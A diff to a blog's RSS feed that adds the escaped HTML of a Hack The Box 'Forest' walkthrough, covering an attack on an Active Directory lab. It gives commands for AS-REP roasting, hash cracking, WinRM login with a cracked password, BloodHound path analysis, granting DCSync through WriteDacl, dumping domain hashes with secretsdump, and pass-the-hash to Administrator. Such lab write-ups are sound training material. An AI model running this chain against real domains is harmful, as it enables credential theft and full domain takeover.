+&lt;p&gt;Interestingly, none of the users we obtained seem to be vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;. Therefore, we will proceed to enumerate another protocol identified during our &lt;em&gt;Nmap&lt;/em&gt; scan, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt;, again using a &lt;em&gt;null session&lt;/em&gt;, as we don’t have credentials. We verify that we can connect successfully, so we will proceed to enumerate additional information. We could list domain groups using &lt;em&gt;enumdomgroup&lt;/em&gt; or, alternatively, list domain users again using &lt;em&gt;enumdomusers&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We observe three new users that we hadn’t detected when enumerating with &lt;em&gt;ldapsearch&lt;/em&gt;. We’re interested in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt;, as both Administrator and krbtgt are created by the &lt;em&gt;AD&lt;/em&gt; itself.&lt;/p&gt;
+
+&lt;p&gt;If we recall, when we used &lt;em&gt;ldapsearch&lt;/em&gt;, we filtered for users whose object class contained &lt;em&gt;user&lt;/em&gt;, and the five users we previously found meet this condition.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, upon further investigation, we discover that this “user” &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; does not have a defined object class. This is likely because it belongs to the &lt;em&gt;Organizational Unit (OU)&lt;/em&gt; of Service Accounts.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once again, by using a one-liner, we could filter and parse the users, refine the list, and use it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt; to check if this new user is vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; is vulnerable to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt;, and we obtain a hash that we will attempt to crack by brute force using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt; along with the &lt;a href=&quot;https://github.com/brannondorsey/naive-hashcat/releases/tag/data&quot;&gt;rockyou.txt&lt;/a&gt; dictionary.&lt;/p&gt;
+
+&lt;p&gt;If we don’t have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;John the Ripper&lt;/code&gt; installed, we can do the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;john
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/to/rockyou.txt/dictionary/ &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we obtain the password for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; user, we can validate the credential before attempting to connect to the target machine to ensure it is correct. Recall that during our &lt;em&gt;Nmap&lt;/em&gt; scan, we observed that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt; (&lt;em&gt;Windows Remote Management&lt;/em&gt;) service is active on the target machine; this will be the protocol we will use for the connection.&lt;/p&gt;
+
+&lt;p&gt;To validate the credential, we will use &lt;em&gt;CrackMapExec&lt;/em&gt; with the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec winrm 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;svc-alfresco&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s3rvice&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We realize that the credential is not only valid, but also that this user belongs to the &lt;em&gt;Remote Management Users&lt;/em&gt; group,  as we see a message next to the username saying &lt;em&gt;Pwn3d!&lt;/em&gt;. Therefore, we can connect to the target machine using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We will proceed to connect as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;svc-alfresco&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s3rvice&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;privilege-escalation&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Privilege Escalation&lt;/h3&gt;
+
+&lt;p&gt;Once inside the target machine, we can start gathering information from the &lt;em&gt;Active Directory&lt;/em&gt; to allow us to escalate privileges. To do this, we will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound&lt;/code&gt;, a data collector for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;, a tool that allows us to analyze and visualize relationships and permissions within an &lt;em&gt;Active Directory&lt;/em&gt; environment to identify potential privilege escalation paths.&lt;/p&gt;
+
+&lt;p&gt;The first thing we will do is download &lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;SharpHound&lt;/a&gt; to our machine. One convenient feature of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; is that it allows us to easily upload and download files. To upload the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound.ps1&lt;/code&gt; file to the target machine, we execute the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upload SharpHound.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once uploaded, we will import and use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-BloodHound&lt;/code&gt; function to collect all the necessary information.&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\SharpHound.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invoke-BloodHound&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-CollectionMethod&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will generate a compressed file containing all the &lt;em&gt;AD&lt;/em&gt; information. To download this file to our machine, we use the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;download &amp;lt;timestamp&amp;gt;_BloodHound.zip BloodHound.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is to import the compressed file generated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SharpHound&lt;/code&gt; into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;. If we don’t have the tool installed, we can do the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;neo4j bloodhound
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;em&gt;Neo4j&lt;/em&gt; is the graph database used by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;. We will start it as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;neo4j console
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It will instruct us to navigate to &lt;a href=&quot;http://localhost:7474/&quot;&gt;http://localhost:7474/&lt;/a&gt;. To connect to &lt;em&gt;Neo4j&lt;/em&gt; for the first time, the default credentials we will enter are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Username: neo4j&lt;/li&gt;
+  &lt;li&gt;Password: neo4j&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It will then prompt us to change the password, which we will use for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt; and log in, on the right side, we will see a section labeled &lt;em&gt;Upload Data&lt;/em&gt;. This is where we will upload our compressed file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the search bar at the top left, we can search for the user we just compromised, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt;. We can right-click on it and select &lt;em&gt;Mark User as Owned&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we go to the &lt;em&gt;Analysis&lt;/em&gt; section, we will find a &lt;em&gt;Shortest Paths&lt;/em&gt; section. Within this section, we select &lt;em&gt;Shortest Path from Owned Principals&lt;/em&gt;. When we click, a graph will display showing the best path to become a system administrator.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; is a member of the &lt;em&gt;Service Accounts&lt;/em&gt; group, which is a member of the &lt;em&gt;Privileged IT Accounts&lt;/em&gt; group, which in turn is a member of the &lt;em&gt;Account Operators&lt;/em&gt; group. Additionally, the &lt;em&gt;Account Operators&lt;/em&gt; group has &lt;em&gt;GenericAll&lt;/em&gt; permissions over the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group, which grants it full control over this group. The &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group has &lt;em&gt;WriteDacl&lt;/em&gt; permissions over the domain, allowing it to modify the domain’s Discretionary Access Control List (&lt;em&gt;DACL&lt;/em&gt;).&lt;/p&gt;
+
+&lt;p&gt;Let’s break this down: the &lt;em&gt;Account Operators&lt;/em&gt; group grants limited account creation privileges to a user. Therefore, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; user can create additional accounts in the domain. Additionally, the &lt;em&gt;Account Operators&lt;/em&gt; group has &lt;em&gt;GenericAll&lt;/em&gt; permissions over the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group, meaning &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; can modify the permissions of the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group. Finally, the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group has &lt;em&gt;WriteDacl&lt;/em&gt; permissions over the domain. We will exploit this to grant ourselves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCSync&lt;/code&gt; privileges.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCSync&lt;/code&gt; attack simulates the behavior of a &lt;em&gt;Domain Controller&lt;/em&gt; and requests other &lt;em&gt;Domain Controllers&lt;/em&gt; to replicate information using the Directory Replication Service Remote Protocol (&lt;em&gt;MS-DRSR&lt;/em&gt;). Since this protocol is essential to &lt;em&gt;Active Directory’s&lt;/em&gt; functionality, it cannot be disabled. By performing this attack, we can replicate domain information and dump all the domain hashes.&lt;/p&gt;
+
+&lt;p&gt;With all this said, the first thing we will do is take advantage of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; being a member of the &lt;em&gt;Account Operators&lt;/em&gt; group and create a new user. To do this, we will use the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user username password /add /domain
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is to add the newly created user to the &lt;em&gt;Exchange Windows Permissions&lt;/em&gt; group, taking advantage of the full control that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-alfresco&lt;/code&gt; full control has over this group:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Add-ADGroupMember&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Exchange Windows Permissions&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Members&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We will also add this user to the &lt;em&gt;Remote Management Users&lt;/em&gt; group so that it can connect via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Add-ADGroupMember&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Remote Management Users&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Members&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By adding the user to the &lt;em&gt;Remote Management Users&lt;/em&gt; group, we avoid the use of &lt;em&gt;PSCredentials&lt;/em&gt;, which are normally used to execute commands with another user’s credentials, which personally caused conflicts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerView&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Next, we will close the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; session and reconnect with the newly created user. Once connected as the new user, we will download the &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerView&lt;/a&gt; script to our machine, which is part of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PowerSploit&lt;/code&gt; (a collection of PowerShell scripts). As before, we will upload it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; and then import it:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PowerView.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\PowerView.ps1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once imported, we will use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Add-DomainObjectAcl&lt;/code&gt; function to grant &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCsync&lt;/code&gt; permissions to our newly created user:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Add-DomainObjectAcl &lt;span class=&quot;nt&quot;&gt;-TargetIdentity&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;DC=htb,DC=local&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-PrincipalIdentity&lt;/span&gt; username &lt;span class=&quot;nt&quot;&gt;-Rights&lt;/span&gt; DCSync
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCsync&lt;/code&gt; permissions granted to our user, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretsdump&lt;/code&gt;, another script from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt; suite, to dump all domain users’ hashes:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-secretsdump htb.local/username:password@10.10.10.161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, we can perform a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pass the Hash&lt;/code&gt; attack, which involves using the &lt;em&gt;hash&lt;/em&gt; we just obtained instead of the password (which we don’t know) to authenticate. For this, we could use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; (another script from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt;) or alternatively, via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Evil-WinRM&lt;/code&gt; itself.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Administrator&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HASH&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-psexec administrator@10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-hash&lt;/span&gt; HASH
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 19 Aug 2024 00:00:00 -0400</pubDate>
+        <link>/en/Forest-Hack-The-Box/</link>
+        <guid isPermaLink="true">/en/Forest-Hack-The-Box/</guid>
       </item>
     
       <item>
@@ -531,7 +935,7 @@
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
